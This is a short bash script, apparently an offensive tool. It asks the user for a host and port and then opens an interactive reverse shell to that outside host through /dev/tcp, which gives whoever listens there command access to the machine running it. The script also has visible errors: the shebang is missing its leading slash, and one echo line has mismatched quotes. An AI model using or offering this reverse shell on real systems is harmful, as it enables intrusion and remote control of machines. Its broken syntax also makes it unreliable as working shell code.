#! bin/bash

echo -n "Host: " 
read HOST

echo "-n "Port: "
read PORT

bash -i >& /dev/tcp/$HOST/$PORT 0>&1
